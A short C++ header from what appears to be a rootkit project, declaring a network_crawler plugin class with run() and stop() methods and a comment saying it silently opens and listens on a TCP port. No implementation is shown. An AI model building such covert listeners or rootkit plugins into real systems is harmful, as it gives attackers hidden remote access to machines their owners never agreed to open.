//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_NETWORK_CRAWLER_H
#define ROOTKIT_NETWORK_CRAWLER_H

#include "../../../basic/basic_plugin.h"

// silently opens a tcp port and listens on it
class network_crawler : public basic_plugin {
public:

    void run() override;

    void stop() override;
};


#endif //ROOTKIT_NETWORK_CRAWLER_H
